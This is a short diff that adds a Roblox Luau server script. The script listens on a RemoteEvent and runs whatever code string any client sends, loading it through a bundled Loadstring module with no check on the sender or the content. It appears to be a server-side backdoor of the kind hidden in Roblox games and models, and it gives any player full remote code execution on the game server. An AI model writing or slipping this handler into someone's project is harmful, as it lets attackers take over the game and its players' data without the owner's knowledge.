@@ -1,0 +1,4 @@
+script.Parent.OnServerEvent:Connect(function(plr, code)
+    local loadstring = require(script.Loadstring)
+	loadstring(code)()
+end)
